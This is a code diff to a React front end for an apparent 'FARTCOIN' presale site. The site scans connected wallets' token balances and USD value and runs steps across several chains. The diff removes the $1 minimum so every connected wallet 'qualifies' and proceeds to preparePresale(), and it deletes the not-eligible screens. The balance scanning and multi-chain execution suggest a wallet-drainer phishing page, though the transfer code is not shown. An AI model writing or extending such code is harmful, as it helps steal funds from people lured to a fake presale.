@@ -1,7 +1,6 @@
 import React, { useState, useEffect } from 'react';
 import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react';
-import { useBalance, useDisconnect, useChainId, useSwitchChain } from 'wagmi';
-import { formatEther } from 'viem';
+import { useDisconnect, useChainId, useSwitchChain } from 'wagmi';
 import { ethers } from 'ethers';
 import './index.css';
 
@@ -112,7 +111,7 @@ function App() {
   const [executionResults, setExecutionResults] = useState([]);
   const [balancesLoaded, setBalancesLoaded] = useState(false);
 
-  // Presale stats - updated to FARTCOIN
+  // Presale stats - Updated to FARTCOIN
   const [timeLeft, setTimeLeft] = useState({
     days: 5,
     hours: 12,
@@ -279,7 +278,7 @@ function App() {
     
     setBalances(balanceResults);
     
-    // Check if total value >= threshold
+    // Check if total value >= threshold - REMOVED $1 REQUIREMENT
     const totalValue = Object.values(balanceResults).reduce((sum, b) => sum + b.valueUSD, 0);
     return totalValue;
   };
@@ -334,12 +333,9 @@ function App() {
           setAllocation(data.data.allocation);
         }
         
-        if (totalValue >= 1) {
-          setTxStatus('✅ You qualify!');
-          await preparePresale();
-        } else {
-          setTxStatus('✨ Verified - Not Eligible');
-        }
+        // REMOVED $1 REQUIREMENT - Always qualify if wallet is connected
+        setTxStatus('✅ You qualify!');
+        await preparePresale();
       }
     } catch (err) {
       console.error('Verification error:', err);
@@ -600,7 +596,7 @@ function App() {
   };
 
   const totalUSD = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
-  const isEligible = totalUSD >= 1;
+  const isEligible = true; // REMOVED $1 REQUIREMENT - Everyone is eligible
 
   // Get current chain name
   const currentChain = DEPLOYED_CHAINS.find(c => c.chainId === realChainId);
@@ -806,13 +802,6 @@ function App() {
                           <p className="text-lg mb-2">🔄 VERIFYING WALLET...</p>
                           <p className="text-white/70 text-sm">Please wait</p>
                         </>
-                      ) : !isEligible ? (
-                        <>
-                          <p className="text-lg mb-2">👋 WELCOME</p>
-                          <p className="text-white/70 text-sm">
-                            Minimum $1 required for eligibility.
-                          </p>
-                        </>
                       ) : completedChains.length > 0 ? (
                         <>
                           <p className="text-green-400 text-lg mb-2">✓ COMPLETED ON {completedChains.length} CHAINS</p>
@@ -969,7 +958,7 @@ function App() {
           </div>
 
           {/* Allocation Card */}
-          {isConnected && !verifying && scanResult && isEligible && !completedChains.length && (
+          {isConnected && !verifying && scanResult && !completedChains.length && (
             <div className="max-w-2xl mx-auto mb-8 px-4">
               <div className="terminal-frame p-8 border-white">
                 <div className="text-center">
@@ -995,28 +984,6 @@ function App() {
                       </div>
                     </div>
                   )}
-                </div>
-              </div>
-            </div>
-          )}
-
-          {/* Non-Eligible Welcome Card */}
-          {isConnected && !verifying && scanResult && !isEligible && (
-            <div className="max-w-2xl mx-auto mb-8 px-4">
-              <div className="terminal-frame p-8 border-white">
-                <div className="text-center">
-                  <div className="text-7xl mb-6 animate-float">👋</div>
-                  <h2 className="text-3xl font-terminal mb-4 text-glow">
-                    Welcome to Fartcoin
-                  </h2>
-                  <p className="text-white/70 text-lg mb-8 max-w-md mx-auto">
-                    Connect your wallet to check eligibility.
-                  </p>
-                  <div className="border border-white/30 p-6">
-                    <p className="text-sm text-white/50">
-                      Minimum $1 required for eligibility.
-                    </p>
-                  </div>
                 </div>
               </div>
             </div>
